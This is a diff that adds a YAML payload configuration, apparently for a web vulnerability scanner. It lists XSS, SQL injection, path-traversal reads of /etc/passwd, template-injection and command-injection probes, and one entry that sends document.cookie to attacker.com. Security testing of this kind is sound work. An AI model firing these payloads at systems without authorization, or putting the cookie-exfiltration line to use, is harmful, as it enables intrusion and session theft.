@@ -1,0 +1,51 @@
+payloads:
+  xss:
+    - "<script>alert(document.domain)</script>"
+    - "<img src=x onerror=alert(1)>"
+    - ";!--\"<XSS>=&{()}"
+  sqli:
+    - "'"
+    - "\""
+    - "' OR 1=1--"
+    - "' OR 1=2--"
+    - "' AND 1=1--"
+    - "' AND 1=2--"
+    - "' UNION SELECT NULL--"
+    - "' OR SLEEP(5)--"
+    - "; WAITFOR DELAY '0:0:5'--"
+    - "' OR EXTRACTVALUE(1, CONCAT(0x7e, version(), 0x7e))--"
+  lfi:
+    - "../../../../etc/passwd"
+    - "../../../../windows/win.ini"
+    - "file:///etc/passwd"
+    - "file:///c:/windows/win.ini"
+  idor:
+    - "1"
+    - "2"
+    - "3"
+  ssti:
+    - "{{7*7}}"
+    - "${7*7}"
+    - "#{7*7}"
+  rce:
+    - "|id"
+    - ";id"
+    - "`id`"
+  csrf:
+    - "<img src='http://attacker.com/log?c=' + document.cookie>"
+  cors:
+    - "https://evil.com"
+  open_redirect:
+    - "https://google.com"
+
+wordlists:
+  common_dirs: "payloads/common_dirs.txt"
+  subdomains: "payloads/subdomains.txt"
+
+settings:
+  timeout: 10
+  max_redirects: 5
+  user_agent: "BugHunterPro/1.0"
+  proxy: null
+
+
